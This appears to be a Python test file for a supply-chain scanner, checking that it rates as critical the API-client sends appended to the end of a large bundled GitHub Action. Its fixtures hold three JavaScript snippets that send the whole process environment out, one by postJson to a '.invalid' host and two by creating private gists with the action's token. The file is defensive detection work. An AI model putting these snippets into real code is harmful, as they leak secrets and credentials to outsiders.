"""BIG-BUNDLE-TAIL (0.1.9): an API client's sends at the end of a bundle past 2,000,000 characters (where ncc puts
an action's own code), read by the supply-chain tree, which knows the clients' own shapes: @actions/http-client's
postJson, and Octokit's REST methods and its `request` with a route (an Action's client, `getOctokit`: its methods are
made at run time, through hooks and a table, which no reading of the code follows to its fetch).

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.scanner import core
from tests.registry import _bundle_support as bb

SENDS = {
    "@actions/http-client's postJson": ('const xc = new (require("@actions/http-client").HttpClient)("x");\n'
                                        'await xc.postJson("https://c.invalid/x", process.env);\n'),
    "Octokit's REST method": ('const gh = require("@actions/github").getOctokit(core.getInput("token"));\n'
                              'await gh.rest.gists.create({ public: false, files: { "e.json": { content: '
                              'JSON.stringify(process.env) } } });\n'),
    "Octokit's request": ('const gr = require("@actions/github").getOctokit(core.getInput("token"));\n'
                          'await gr.request("POST /gists", { files: { "e.json": { content: JSON.stringify(process.env) '
                          '} } });\n'),
}


class ClientsTests(unittest.TestCase):
    def test_each_clients_send_at_the_bundles_end(self):
        for what, code in SENDS.items():
            with self.subTest(what):
                text = bb.bundle(main="  " + code.replace("\n", "\n  "))
                reasons, line = core.import_time_risk(text, "js")
                self.assertEqual(core.import_time_severity(reasons), "CRITICAL", reasons)
                self.assertGreater(line, text[:text.index("async function run()")].count("\n"))


if __name__ == "__main__":
    unittest.main()
